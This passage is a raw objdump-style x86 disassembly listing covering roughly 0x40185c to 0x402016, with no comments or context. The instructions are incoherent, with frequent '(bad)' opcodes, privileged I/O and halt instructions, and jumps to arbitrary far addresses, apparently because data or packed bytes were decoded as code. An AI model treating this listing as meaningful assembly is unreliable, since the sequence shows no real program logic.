  40185c:	inc    esp
  40185d:	xchg   edx,eax
  40185e:	and    al,0xc9
  401860:	into   
  401861:	pop    ds
  401862:	fist   DWORD PTR [ecx]
  401864:	mov    bh,0x1b
  401866:	aas    
  401867:	or     eax,0x340eccb9
  40186c:	div    bl
  40186e:	fdivr  QWORD PTR [eax]
  401870:	dec    esp
  401871:	or     BYTE PTR [ecx+0x5b],0x6e
  401875:	cmp    ebp,ebp
  401877:	mov    cl,0xe3
  401879:	or     dh,ah
  40187b:	(bad)  
  40187c:	push   ds
  40187d:	bnd js 0x40182d
  401880:	push   0xffffffd9
  401882:	mov    bl,0x8
  401884:	repz adc BYTE PTR [ecx-0x25],ch
  401888:	jae    0x40186c
  40188a:	fcmovne st,st(3)
  40188c:	aad    0xd2
  40188e:	inc    edi
  40188f:	mov    ch,0xaf
  401891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401893:	es dec edx
  401895:	arpl   WORD PTR [esi],si
  401897:	aas    
  401898:	jbe    0x401917
  40189a:	imul   ebp,DWORD PTR [ebp+0x46],0x19
  40189e:	mov    eax,0xb14e1189
  4018a3:	and    ebx,DWORD PTR [ecx+0x4d]
  4018a6:	fcmovne st,st(3)
  4018a8:	fcom   QWORD PTR [ebx+0x333d6b7c]
  4018ae:	ins    BYTE PTR es:[edi],dx
  4018af:	xor    al,0xe1
  4018b1:	mov    DWORD PTR [edi+0x77b906b9],esp
  4018b7:	lods   al,BYTE PTR ds:[esi]
  4018b8:	push   esp
  4018b9:	jne    0x401871
  4018bb:	imul   esi,DWORD PTR [edx+eiz*4],0xffffffdc
  4018bf:	sub    DWORD PTR [eax],edx
  4018c1:	push   edx
  4018c2:	imul   ebp,DWORD PTR [ecx+0x7e],0xffffffae
  4018c6:	mov    al,0x99
  4018c8:	dec    edi
  4018c9:	and    edx,DWORD PTR [edx]
  4018cb:	dec    ebx
  4018cc:	data16 aas 
  4018ce:	js     0x4018a0
  4018d0:	add    al,0xe4
  4018d2:	bound  esi,QWORD PTR [eax+0x2d]
  4018d5:	lock adc esp,DWORD PTR [edx-0x7853e412]
  4018dc:	jae    0x40186a
  4018de:	cmp    ebx,esp
  4018e0:	(bad)  
  4018e1:	mov    ecx,0xdfd4b644
  4018e6:	stos   BYTE PTR es:[edi],al
  4018e7:	sbb    bh,cl
  4018e9:	shr    DWORD PTR [edi+ebp*1+0x174ca1e2],1
  4018f0:	call   0x6595:0xfea45f33
  4018f7:	jno    0x401919
  4018f9:	stc    
  4018fa:	xor    al,0xa4
  4018fc:	cmp    BYTE PTR [edi-0xa],bh
  4018ff:	(bad)  
  401900:	mov    ch,0xc0
  401902:	xchg   BYTE PTR [eax-0x76c1f799],dl
  401908:	push   esp
  401909:	cmp    al,0x55
  40190b:	std    
  40190c:	xor    eax,0xfbf617c0
  401911:	or     dl,BYTE PTR [esi]
  401913:	mov    esp,0xb62446f2
  401918:	lock xchg edi,eax
  40191a:	inc    ebp
  40191b:	mov    ecx,0xf63a56c0
  401920:	ins    BYTE PTR es:[edi],dx
  401921:	scas   al,BYTE PTR es:[edi]
  401922:	lds    ebx,FWORD PTR [edi-0x8]
  401925:	pop    eax
  401926:	adc    eax,0x10bb3f9b
  40192b:	dec    edx
  40192c:	(bad)  
  40192d:	pop    eax
  40192e:	into   
  40192f:	scas   al,BYTE PTR es:[edi]
  401930:	cmp    DWORD PTR [ebx+ebp*8],edi
  401933:	loopne 0x4018ca
  401935:	aad    0x41
  401937:	es cwde 
  401939:	xchg   ebp,eax
  40193a:	jnp    0x401962
  40193c:	hlt    
  40193d:	into   
  40193e:	gs xchg edi,eax
  401940:	ss shr edx,1
  401943:	sti    
  401944:	imul   ebp,DWORD PTR [edx+0x2],0xffffffaa
  401948:	pop    eax
  401949:	push   ecx
  40194a:	icebp  
  40194b:	cli    
  40194c:	(bad)  
  40194d:	les    eax,FWORD PTR [ebx-0x14a0b81c]
  401953:	sbb    ebx,DWORD PTR [ebp+0x3d]
  401956:	mov    dl,0xa5
  401958:	mov    ah,0x4c
  40195a:	aam    0xdc
  40195c:	(bad)  
  40195d:	pushf  
  40195e:	ret    0x4b0b
  401961:	imul   eax,DWORD PTR [edi-0x5b],0xfc39b1b9
  401968:	pop    ss
  401969:	mov    edi,0x9067a518
  40196e:	mov    cs,esp
  401970:	iret   
  401971:	bound  eax,QWORD PTR [esi*2-0x75e38882]
  401978:	xchg   ebp,eax
  401979:	scas   eax,DWORD PTR es:[edi]
  40197a:	cmp    BYTE PTR [ebp+0x6c990e5],al
  401980:	adc    al,0x6a
  401982:	in     eax,dx
  401983:	mov    BYTE PTR [edx+0x21],ah
  401986:	hlt    
  401987:	adc    DWORD PTR ds:0x98d6245b,edx
  40198d:	mov    esp,0xab4bbcb6
  401992:	jbe    0x401972
  401994:	xor    dh,BYTE PTR ds:0xf3e47c24
  40199a:	icebp  
  40199b:	in     al,0x5b
  40199d:	jp     0x4019ec
  40199f:	push   es
  4019a0:	add    bh,BYTE PTR ds:0x27cfef44
  4019a6:	inc    edi
  4019a7:	lods   al,BYTE PTR ds:[esi]
  4019a8:	ja     0x40197f
  4019aa:	fsubrp st(7),st
  4019ac:	sub    DWORD PTR [ecx-0x5a213e6],eax
  4019b2:	mov    ebx,0xff036c82
  4019b7:	pop    ebp
  4019b8:	and    DWORD PTR [ecx-0x6c],edx
  4019bb:	(bad)  
  4019bc:	mov    ds:0x22473a72,al
  4019c1:	jne    0x40197d
  4019c3:	xchg   esi,eax
  4019c4:	lds    edx,FWORD PTR [bx-0x25]
  4019c8:	pushf  
  4019c9:	xor    eax,0xe5740f43
  4019ce:	mov    DWORD PTR [edi],ebp
  4019d0:	xchg   esp,eax
  4019d1:	mov    ebp,0x56ea8a59
  4019d6:	scas   al,BYTE PTR es:[edi]
  4019d7:	bound  ecx,QWORD PTR [edx+0x1fdf968c]
  4019dd:	xor    DWORD PTR [ecx+0x28b964e1],edi
  4019e3:	xchg   DWORD PTR [ebp-0x2659e831],esp
  4019e9:	push   0x70
  4019eb:	or     BYTE PTR [eax-0x7f347b9f],cl
  4019f1:	cld    
  4019f2:	mov    ah,0x7e
  4019f4:	xchg   esi,eax
  4019f5:	mov    ecx,DWORD PTR [ecx]
  4019f7:	call   0xf5142a71
  4019fc:	push   ebp
  4019fd:	pop    esi
  4019fe:	push   ebx
  4019ff:	ret    
  401a00:	retf   
  401a01:	daa    
  401a02:	fs fwait
  401a04:	out    dx,eax
  401a05:	xchg   edi,eax
  401a06:	ret    
  401a07:	add    esp,DWORD PTR [eax-0x68259ff7]
  401a0d:	(bad)  
  401a0e:	jge    0x401a1f
  401a10:	push   cs
  401a11:	mov    ds:0x18b5d738,eax
  401a16:	enter  0x8af9,0x7b
  401a1a:	retf   0xfcaa
  401a1d:	scas   eax,DWORD PTR es:[edi]
  401a1e:	sti    
  401a1f:	xor    esp,edi
  401a21:	sub    BYTE PTR [ecx+eax*2-0x7aa504a1],dh
  401a28:	stc    
  401a29:	ss dec esi
  401a2b:	test   BYTE PTR [eax-0x1a39bda3],al
  401a31:	sub    esp,DWORD PTR [ebx]
  401a33:	push   eax
  401a34:	pop    ds
  401a35:	cld    
  401a36:	js     0x4019ee
  401a38:	cmp    DWORD PTR [esi],edi
  401a3a:	sub    al,0x53
  401a3c:	mov    DWORD PTR [eax-0x3e],edx
  401a3f:	sub    eax,0xd9da2d6f
  401a44:	pop    es
  401a45:	sub    ebx,DWORD PTR [ecx-0x6e2f195b]
  401a4b:	and    BYTE PTR [eax-0x1b5b1953],dh
  401a51:	icebp  
  401a52:	(bad)  
  401a54:	dec    esp
  401a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a56:	jmp    0x401a58
  401a58:	xchg   ebp,eax
  401a59:	and    eax,ecx
  401a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a5c:	sbb    eax,0x66c7ece6
  401a61:	and    dl,BYTE PTR [esi-0x7b]
  401a64:	sub    esi,DWORD PTR [ecx+0x28b557d]
  401a6a:	pop    edx
  401a6b:	or     BYTE PTR [eax],bl
  401a6d:	push   ss
  401a6e:	shr    BYTE PTR [ecx-0x2d],0x47
  401a72:	xchg   edx,eax
  401a73:	enter  0x5e4,0x27
  401a77:	fcomp  DWORD PTR [edi-0x5e]
  401a7a:	repz loopne 0x401a23
  401a7d:	shld   DWORD PTR [ebp-0x29],ecx,cl
  401a81:	fwait
  401a82:	outs   dx,BYTE PTR ds:[esi]
  401a83:	or     cl,BYTE PTR [esi+0x23f30d82]
  401a89:	or     BYTE PTR [edi],dl
  401a8b:	aam    0x79
  401a8d:	lea    edx,[esi]
  401a8f:	pop    si
  401a92:	add    al,0x69
  401a94:	xchg   esi,eax
  401a95:	hlt    
  401a96:	dec    eax
  401a97:	adc    DWORD PTR [edx-0x6a0b8bb7],eax
  401a9d:	jmp    0x6d97da21
  401aa2:	add    eax,0x960e0e31
  401aa7:	cmp    bh,cl
  401aa9:	mov    ds:0x7f57aa85,eax
  401aae:	int3   
  401aaf:	xchg   edx,eax
  401ab0:	cli    
  401ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ab2:	mov    ds:0xdcc82a17,al
  401ab7:	out    0xe1,al
  401ab9:	jl     0x401b24
  401abb:	rcl    DWORD PTR [edx-0x45],1
  401abe:	push   ebx
  401abf:	fnstenv [esi+0x3e]
  401ac2:	icebp  
  401ac3:	add    BYTE PTR [esi+0x13dd1704],ch
  401ac9:	mov    ebp,DWORD PTR [eax-0x4a19a35a]
  401acf:	mul    DWORD PTR ds:0x440d909e
  401ad5:	pop    edx
  401ad6:	xor    bh,BYTE PTR ds:0xd09a2bd3
  401adc:	ds nop
  401ade:	pop    esi
  401adf:	enter  0x7699,0x43
  401ae3:	mov    esi,0xb44cf34c
  401ae8:	xchg   ecx,eax
  401ae9:	pop    edx
  401aea:	(bad)  
  401aeb:	push   eax
  401aec:	jmp    0xe0435972
  401af1:	call   0xdb401f68
  401af6:	mov    ds:0xc696bed6,al
  401afb:	dec    esi
  401afc:	pop    esp
  401afd:	mul    BYTE PTR [edx+0x2]
  401b00:	adc    esi,DWORD PTR [eax+0x6f]
  401b03:	(bad)  
  401b04:	call   0xcfdda289
  401b09:	jmp    0x199b:0x1e65b339
  401b10:	mov    ecx,0xfeab30db
  401b15:	push   ebx
  401b16:	inc    esp
  401b17:	adc    BYTE PTR [ebp+esi*1-0x70],dl
  401b1b:	or     BYTE PTR [edi],0x6e
  401b1e:	dec    edx
  401b1f:	ds cmp al,0x7d
  401b22:	sbb    ebp,DWORD PTR [ecx+0x56f18be9]
  401b28:	mov    ebx,0xaaf857ce
  401b2d:	stos   DWORD PTR es:[edi],eax
  401b2e:	arpl   WORD PTR [esi+0x43],dx
  401b31:	vpshaq ymm9,xmm0,[esi+0xbd65d7]
  401b3a:	push   es
  401b3b:	jmp    0x401b03
  401b3d:	repnz push 0x3aa4d25b
  401b43:	jno    0x401b9f
  401b45:	rcr    DWORD PTR [edi+0x2760d551],0x1e
  401b4c:	dec    ebx
  401b4d:	(bad)
  401b50:	aaa    
  401b51:	fs mov bl,0xc7
  401b54:	jl     0x401b43
  401b56:	ss ja  0x401ae5
  401b59:	inc    edi
  401b5a:	or     dh,BYTE PTR [esi+0x1341da40]
  401b60:	fwait
  401b61:	push   0x8816c9fa
  401b66:	cmp    eax,0x968bf6ed
  401b6b:	jns    0x401b4a
  401b6d:	retf   0x1a0
  401b70:	ins    DWORD PTR es:[edi],dx
  401b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b72:	sub    eax,0x74e07f12
  401b77:	adc    dh,BYTE PTR [ebx+0x1cd9bea7]
  401b7d:	aaa    
  401b7e:	mov    dh,0x37
  401b80:	ds (bad) 
  401b82:	pop    ss
  401b83:	jo     0x401b9f
  401b85:	ins    BYTE PTR es:[edi],dx
  401b86:	in     al,0x70
  401b88:	not    DWORD PTR [edi+0x32]
  401b8b:	push   ebx
  401b8c:	js     0x401be4
  401b8e:	data16 jle 0x401b1c
  401b91:	pop    esp
  401b92:	addr16 inc eax
  401b94:	outs   dx,DWORD PTR ds:[esi]
  401b95:	icebp  
  401b96:	mov    esp,0xbb107d07
  401b9b:	scas   eax,DWORD PTR es:[edi]
  401b9c:	jmp    0xd7e77142
  401ba1:	mov    bl,0xe2
  401ba3:	inc    ebx
  401ba4:	sub    BYTE PTR [eax+0x7d],dl
  401ba7:	xchg   ecx,eax
  401ba8:	rcpps  xmm2,XMMWORD PTR [eax-0x34]
  401bac:	and    DWORD PTR [ebx-0x4817693],edx
  401bb2:	jmp    0x7686:0xe0f5e1c2
  401bb9:	sti    
  401bba:	mov    dl,BYTE PTR [ecx+0x3c]
  401bbd:	dec    ebx
  401bbe:	mov    al,0xf9
  401bc0:	and    DWORD PTR [edi+0x2a788d95],edi
  401bc6:	adc    eax,0xce84a5fc
  401bcb:	mov    edx,0xd7ede23b
  401bd0:	xchg   ebp,eax
  401bd1:	sbb    al,0x7f
  401bd3:	jge    0x401c19
  401bd5:	fdiv   QWORD PTR [ebx]
  401bd7:	fnsave [edx-0x63a382b7]
  401bdd:	in     eax,0x57
  401bdf:	xchg   esp,eax
  401be0:	arpl   dx,dx
  401be2:	xchg   ebp,eax
  401be3:	out    dx,al
  401be4:	push   esi
  401be5:	add    dh,BYTE PTR [ebp+0x6d]
  401be8:	sahf   
  401be9:	je     0x401c1f
  401beb:	retf   0xfafb
  401bee:	outs   dx,DWORD PTR ds:[esi]
  401bef:	stc    
  401bf0:	loop   0x401c5f
  401bf2:	ror    DWORD PTR [ebp+0x39],1
  401bf5:	pop    ds
  401bf6:	out    dx,eax
  401bf7:	mov    al,0xc1
  401bf9:	dec    esi
  401bfa:	and    al,0xc6
  401bfc:	xchg   ebp,eax
  401bfd:	sub    BYTE PTR [ecx-0x5dbf3ccb],ah
  401c03:	ins    BYTE PTR es:[edi],dx
  401c04:	test   BYTE PTR [esi+0x4b],0x58
  401c08:	in     eax,0xfc
  401c0a:	mov    edx,DWORD PTR [ebx]
  401c0c:	xor    BYTE PTR [esi-0x67b1fdc3],cl
  401c12:	or     edx,DWORD PTR [ebp+0x3]
  401c15:	cmp    eax,0xd191fc69
  401c1a:	cmc    
  401c1b:	fdivr  QWORD PTR [edx+0x7c]
  401c1e:	sahf   
  401c1f:	cld    
  401c20:	mov    ch,0xb0
  401c22:	push   edx
  401c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c24:	call   0x5b7f1c34
  401c29:	sub    ecx,esp
  401c2b:	cmc    
  401c2c:	cli    
  401c2d:	outs   dx,DWORD PTR ds:[esi]
  401c2e:	push   edi
  401c2f:	ror    BYTE PTR [edx],0x18
  401c32:	test   al,0xf
  401c34:	aam    0xe2
  401c36:	and    BYTE PTR [ebp-0x51],0x97
  401c3a:	fst    QWORD PTR [ecx-0xdccf256]
  401c40:	adc    DWORD PTR [ecx-0x70043205],ebx
  401c46:	jmp    0x55b05dac
  401c4b:	pop    edx
  401c4c:	sub    al,0x55
  401c4e:	lods   eax,DWORD PTR ds:[esi]
  401c4f:	xor    bh,BYTE PTR [esi+eiz*2]
  401c52:	xor    BYTE PTR [edi+eiz*1],0x66
  401c56:	or     al,0x25
  401c58:	shl    edx,0x6b
  401c5b:	xchg   BYTE PTR [eax+0x15],dh
  401c5e:	mov    dl,0xa6
  401c60:	inc    ecx
  401c61:	clc    
  401c62:	fs sbb eax,0xdeec421f
  401c68:	jg     0x401cdf
  401c6a:	dec    ebp
  401c6b:	mov    dl,ch
  401c6d:	push   edx
  401c6e:	(bad)  
  401c6f:	aas    
  401c70:	call   0x6bd3:0xe505a937
  401c77:	push   edx
  401c78:	sub    BYTE PTR [ebp+0x34797cfb],dl
  401c7e:	shr    DWORD PTR [edx-0x1690f29a],cl
  401c84:	sub    eax,0x6171b075
  401c89:	dec    esi
  401c8a:	ja     0x401c76
  401c8c:	inc    esi
  401c8d:	(bad)  
  401c8e:	loope  0x401d05
  401c90:	jns    0x401cc8
  401c92:	mov    ds:0x8eeb29a,eax
  401c97:	adc    cl,dl
  401c99:	mov    ecx,0xe801d1e1
  401c9e:	and    eax,0xd580d29
  401ca3:	mov    al,0xc2
  401ca5:	mov    ebp,0x4de2bd09
  401caa:	xor    al,0xc3
  401cac:	fwait
  401cad:	jg     0x401d08
  401caf:	pop    ebx
  401cb0:	int3   
  401cb1:	or     eax,0xf73a29d7
  401cb6:	mov    bl,0x24
  401cb8:	int    0x60
  401cba:	pop    ss
  401cbb:	inc    edi
  401cbc:	mov    WORD PTR [esi+0xc],fs
  401cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cc0:	sub    eax,0x94cbe5b0
  401cc5:	jne    0x401c89
  401cc7:	sbb    al,0x1f
  401cc9:	and    BYTE PTR [edx+0x6cd7e9a8],dl
  401ccf:	ins    DWORD PTR es:[edi],dx
  401cd0:	mov    ah,0x43
  401cd2:	data16 cmp BYTE PTR [esi-0x7d],ch
  401cd6:	dec    ecx
  401cd7:	in     al,dx
  401cd8:	cmc    
  401cd9:	and    cl,BYTE PTR [ebx-0x714c7667]
  401cdf:	pushf  
  401ce0:	sbb    DWORD PTR [ecx-0x4e],0xdeefa5e8
  401ce7:	popa   
  401ce8:	or     ecx,DWORD PTR [ebx]
  401cea:	imul   edx,DWORD PTR [ecx+eiz*4-0x7212a093],0x27b40461
  401cf5:	fdiv   DWORD PTR [ebx-0x327dfe6e]
  401cfb:	sub    edi,eax
  401cfd:	sub    al,0x59
  401cff:	jmp    0x401d40
  401d01:	mov    edx,0xbd14679
  401d06:	dec    ebp
  401d07:	(bad)  
  401d08:	sti    
  401d09:	popf   
  401d0a:	lods   al,BYTE PTR cs:[esi]
  401d0c:	lea    ecx,[edx]
  401d0e:	cmp    BYTE PTR [ecx+0x61],0x46
  401d12:	fist   DWORD PTR [esi-0x35062778]
  401d18:	gs stos DWORD PTR es:[edi],eax
  401d1a:	aaa    
  401d1b:	lods   al,BYTE PTR ds:[esi]
  401d1c:	ror    bl,0x36
  401d1f:	retf   0x4e94
  401d22:	ins    DWORD PTR es:[edi],dx
  401d23:	call   0xa65e810e
  401d28:	mov    ds:0x40923ab4,eax
  401d2d:	pusha  
  401d2e:	jae    0x401cd0
  401d30:	inc    esp
  401d31:	(bad)
  401d36:	adc    ebp,DWORD PTR [ebp-0x2c]
  401d39:	sbb    edx,DWORD PTR [ecx]
  401d3b:	std    
  401d3c:	aaa    
  401d3d:	addr16 sub bh,dl
  401d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d41:	ror    BYTE PTR [ecx-0x5a],0xcf
  401d45:	mov    WORD PTR [ebx+0x72],fs
  401d48:	stos   DWORD PTR es:[edi],eax
  401d49:	jl     0x401d47
  401d4b:	add    eax,0x10584908
  401d50:	jns    0x401d0d
  401d52:	je     0x401d2b
  401d54:	retf   
  401d55:	sbb    ah,ah
  401d57:	jg     0x401d2a
  401d59:	es pop edx
  401d5b:	fistp  WORD PTR [edi]
  401d5d:	push   ss
  401d5e:	inc    edi
  401d5f:	sub    esi,DWORD PTR cs:[edx+0x21025a5]
  401d66:	call   DWORD PTR [ebx+0x250c068e]
  401d6c:	jg     0x401d53
  401d6e:	push   esi
  401d6f:	das    
  401d70:	int    0xdd
  401d72:	pop    ss
  401d73:	fild   DWORD PTR [ebx+0x58ce021]
  401d79:	aas    
  401d7a:	in     eax,0x2c
  401d7c:	mov    ?,WORD PTR [ecx+0x4a]
  401d7f:	xor    DWORD PTR [edi],esp
  401d81:	mov    ds:0x37c779ec,eax
  401d86:	mov    BYTE PTR [edi+ecx*8+0x6b],ch
  401d8a:	dec    esi
  401d8b:	and    dl,BYTE PTR [edi]
  401d8d:	push   cs
  401d8e:	jmp    0xa1263fce
  401d93:	out    0x21,al
  401d95:	xchg   esp,eax
  401d96:	std    
  401d97:	ja     0x401dc9
  401d99:	add    al,ah
  401d9b:	pop    ebp
  401d9c:	add    al,0xbe
  401d9e:	pop    edx
  401d9f:	(bad)  [edx-0x5b]
  401da2:	pop    edi
  401da3:	das    
  401da4:	pop    edx
  401da5:	sbb    DWORD PTR [ecx+0x7cc3c435],0x8c642fae
  401daf:	pop    ds
  401db0:	test   BYTE PTR [ebx+0x7c4d74a8],bh
  401db6:	loope  0x401d52
  401db8:	cmp    al,BYTE PTR ds:0xdccc37c3
  401dbe:	(bad)  
  401dbf:	add    al,0x98
  401dc1:	mov    bh,0xf3
  401dc3:	cli    
  401dc4:	sub    DWORD PTR [ecx-0x14f04528],ebp
  401dca:	stos   DWORD PTR es:[edi],eax
  401dcb:	push   ss
  401dcc:	push   0xffffffae
  401dce:	inc    ebx
  401dcf:	fidiv  WORD PTR [edx+edx*1]
  401dd2:	jnp    0x401d9a
  401dd4:	sbb    BYTE PTR ds:0x84b0a2f7,bh
  401dda:	sahf   
  401ddb:	jmp    0x5c5c74dc
  401de0:	add    al,0x30
  401de2:	hlt    
  401de3:	(bad)  
  401de4:	leave  
  401de5:	lock mov DWORD PTR [ebx+0x3602e047],0x70d2c63e
  401df0:	sbb    DWORD PTR [eax-0xc1f46b2],ecx
  401df6:	ficom  WORD PTR [ecx+eiz*2+0x77]
  401dfa:	or     dh,bl
  401dfc:	pop    es
  401dfd:	cld    
  401dfe:	add    al,0xb0
  401e00:	sub    BYTE PTR [ebp-0x41],al
  401e03:	xchg   ecx,eax
  401e04:	xlat   BYTE PTR ds:[ebx]
  401e05:	inc    ecx
  401e06:	aad    0xb
  401e08:	pop    ecx
  401e09:	sbb    eax,DWORD PTR [esi]
  401e0b:	jecxz  0x401dc9
  401e0d:	push   eax
  401e0e:	add    eax,0x12ed312e
  401e13:	mov    ds:0x42a88546,al
  401e18:	adc    ebp,ebp
  401e1a:	jl     0x401dc5
  401e1c:	inc    edi
  401e1d:	retf   0x74e7
  401e20:	enter  0x1a39,0x40
  401e24:	cdq    
  401e25:	or     cl,0x1b
  401e28:	push   ds
  401e29:	subps  xmm5,XMMWORD PTR [ecx-0x520ec4ed]
  401e30:	mov    esp,edx
  401e32:	pop    edi
  401e33:	mov    ebx,0x33140133
  401e38:	lods   al,BYTE PTR ds:[esi]
  401e39:	lea    ecx,[edi+0x5b]
  401e3c:	(bad)  
  401e3d:	push   ebx
  401e3e:	repz sbb al,0x2e
  401e41:	iret   
  401e42:	xchg   ebx,eax
  401e43:	imul   ebp,DWORD PTR [ebx],0xffffff82
  401e46:	adc    al,0x77
  401e48:	(bad)  
  401e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e4a:	pop    ss
  401e4b:	add    al,0x15
  401e4d:	sbb    eax,0x3329ad10
  401e52:	mov    bl,0x97
  401e54:	adc    eax,esi
  401e56:	(bad)  
  401e57:	(bad)  
  401e58:	xchg   edx,eax
  401e59:	test   BYTE PTR [eax],cl
  401e5b:	fnstenv [edx]
  401e5d:	xor    ecx,DWORD PTR [ebp-0x6a2a8de0]
  401e63:	pop    ecx
  401e64:	(bad)  
  401e65:	ds call 0xc0ecda4e
  401e6b:	pop    esi
  401e6c:	mov    edx,0xe6977aa9
  401e71:	hlt    
  401e72:	pop    es
  401e73:	cli    
  401e74:	enter  0x1b3c,0x7c
  401e78:	and    BYTE PTR [ebx],ch
  401e7a:	stos   DWORD PTR es:[edi],eax
  401e7b:	sti    
  401e7c:	mov    eax,ds:0x236a689
  401e81:	mov    ebp,DWORD PTR [ecx+0x8]
  401e84:	sti    
  401e85:	fdivr  st,st(7)
  401e87:	ins    DWORD PTR es:[edi],dx
  401e88:	shl    BYTE PTR cs:[esi-0x4051b570],cl
  401e8f:	adc    BYTE PTR [edx],ch
  401e91:	je     0x401ece
  401e93:	or     al,0x57
  401e95:	hlt    
  401e96:	xchg   al,al
  401e98:	ins    DWORD PTR es:[edi],dx
  401e99:	iret   
  401e9a:	mov    dl,0x37
  401e9c:	fisub  WORD PTR [esi+0x11]
  401e9f:	and    bh,BYTE PTR [ebx-0x65f9a5fd]
  401ea5:	add    edi,eax
  401ea7:	push   0x9ded8baf
  401eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ead:	sbb    eax,0x49afc404
  401eb2:	fnstsw WORD PTR [ebx+0x40581081]
  401eb8:	jle    0x401f01
  401eba:	push   es
  401ebb:	pop    esi
  401ebc:	mov    edx,0x243dd860
  401ec1:	jmp    0x401e9c
  401ec3:	push   eax
  401ec4:	push   ebp
  401ec5:	ds mov ebp,0xa2719683
  401ecb:	bndldx bnd0,[ecx-0x4568e0b9]
  401ed2:	sub    DWORD PTR [edx+0x2f],edi
  401ed5:	in     al,dx
  401ed6:	push   ebx
  401ed7:	clc    
  401ed8:	add    esi,DWORD PTR [esi-0x36e1c92b]
  401ede:	inc    ebp
  401edf:	pushf  
  401ee0:	icebp  
  401ee1:	call   0x8775:0x7658689c
  401ee8:	xor    al,0xcc
  401eea:	(bad)  
  401eec:	push   0xb824bb13
  401ef1:	xchg   BYTE PTR [ebx],bl
  401ef3:	ret    0x4a73
  401ef6:	mov    eax,0xea1d30f5
  401efb:	jb     0x401f63
  401efd:	adc    DWORD PTR [ecx],eax
  401eff:	xchg   ebp,eax
  401f00:	push   ss
  401f01:	outs   dx,DWORD PTR ds:[esi]
  401f02:	and    edx,ebp
  401f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f05:	inc    esp
  401f06:	lods   eax,DWORD PTR ds:[esi]
  401f07:	sub    al,0x14
  401f09:	inc    ebp
  401f0a:	aad    0x2c
  401f0c:	xchg   ebx,eax
  401f0d:	popf   
  401f0e:	jge    0x401ed3
  401f10:	or     al,0xb5
  401f12:	cmp    bh,BYTE PTR [ebx+ebx*2+0x41]
  401f16:	int3   
  401f17:	retf   0xc029
  401f1a:	xchg   ebp,eax
  401f1b:	outs   dx,DWORD PTR ds:[esi]
  401f1c:	mov    ebx,0xf24ddde8
  401f21:	(bad)  
  401f22:	cld    
  401f23:	push   esp
  401f24:	push   ebp
  401f25:	mov    DWORD PTR [edx],ebx
  401f27:	inc    esi
  401f28:	mov    bl,0x68
  401f2a:	adc    cl,dl
  401f2c:	push   esp
  401f2d:	jle    0x401f02
  401f2f:	test   BYTE PTR [ebx-0x55adea2a],ch
  401f35:	mov    ebx,0xdd14e8c1
  401f3a:	mov    cl,0x6b
  401f3c:	retf   
  401f3d:	pop    ss
  401f3e:	sti    
  401f3f:	arpl   cx,di
  401f41:	xor    al,0x8c
  401f43:	sbb    cl,BYTE PTR [edi+0x4647c602]
  401f49:	pop    ecx
  401f4a:	mov    DWORD PTR [ebx],edx
  401f4c:	push   cs
  401f4d:	leave  
  401f4e:	stc    
  401f4f:	xor    dl,BYTE PTR [esi]
  401f51:	cld    
  401f52:	(bad)  
  401f53:	stc    
  401f54:	sub    ebp,DWORD PTR [ecx+eax*1-0x65]
  401f58:	mov    esp,0xd3b471ab
  401f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f5e:	(bad)  
  401f5f:	fstp   DWORD PTR [edx+0x24]
  401f62:	ins    BYTE PTR es:[edi],dx
  401f63:	xchg   ecx,eax
  401f64:	mov    ah,0xec
  401f66:	retf   0xe839
  401f69:	mov    edx,0xc259d94a
  401f6e:	in     eax,0x30
  401f70:	pop    esi
  401f71:	sti    
  401f72:	(bad)  
  401f73:	shl    DWORD PTR [edi-0x4f4b4031],1
  401f79:	int    0x2a
  401f7b:	ins    DWORD PTR es:[edi],dx
  401f7c:	not    DWORD PTR [ecx+edi*2-0x7b]
  401f80:	push   ebp
  401f81:	inc    esi
  401f82:	test   al,0x1f
  401f84:	jmp    0x19a7ef21
  401f89:	mov    ds:0xf2f601e,eax
  401f8e:	and    al,0xa1
  401f90:	mov    ah,0x49
  401f92:	int    0xdb
  401f94:	in     al,0x49
  401f96:	or     al,ch
  401f98:	bound  esp,QWORD PTR [ecx+0x749c2a5c]
  401f9e:	pop    ebp
  401f9f:	ins    DWORD PTR es:[edi],dx
  401fa0:	out    0xd1,eax
  401fa2:	data16 (bad) 
  401fa4:	cmp    al,BYTE PTR [ecx+ecx*2]
  401fa7:	or     eax,0xbe1957b9
  401fac:	shr    DWORD PTR [edi],0xd
  401faf:	out    0xcc,al
  401fb1:	pop    edx
  401fb2:	mov    al,ds:0xb0869f09
  401fb7:	mov    ds:0x13f4d4d,al
  401fbc:	fucomip st,st(0)
  401fbe:	adc    ecx,DWORD PTR fs:[esi+ebx*1-0x22]
  401fc3:	clc    
  401fc4:	or     ch,dh
  401fc6:	xchg   ecx,eax
  401fc7:	outs   dx,DWORD PTR ds:[esi]
  401fc8:	jp     0x401f76
  401fca:	pop    ss
  401fcb:	inc    ecx
  401fcc:	and    edi,DWORD PTR [esi+eax*2+0x3504ad42]
  401fd3:	cmc    
  401fd4:	jp     0x402052
  401fd6:	out    0x3,eax
  401fd8:	mov    cl,BYTE PTR [eax-0x27c0cbca]
  401fde:	aad    0x16
  401fe0:	pop    ecx
  401fe1:	jmp    0x8506:0xe4868096
  401fe8:	sub    dl,bh
  401fea:	inc    eax
  401feb:	dec    eax
  401fec:	mov    DWORD PTR [ebx-0x2d25c47d],ecx
  401ff2:	or     ebx,0xd7d44244
  401ff8:	xor    ah,al
  401ffa:	stos   BYTE PTR es:[edi],al
  401ffb:	mov    DWORD PTR [ebx+eiz*4+0x1badd693],esi
  402002:	loope  0x401fb0
  402004:	or     ecx,DWORD PTR [edi]
  402006:	pop    ds
  402007:	addr16 jno 0x402082
  40200a:	icebp  
  40200b:	push   edi
  40200c:	sub    al,0xc3
  40200e:	imul   esi,DWORD PTR [edi-0x3],0xffffff98
  402012:	enter  0xb4c5,0xfb
  402016:	shl    DWORD PTR [edx],0x1b
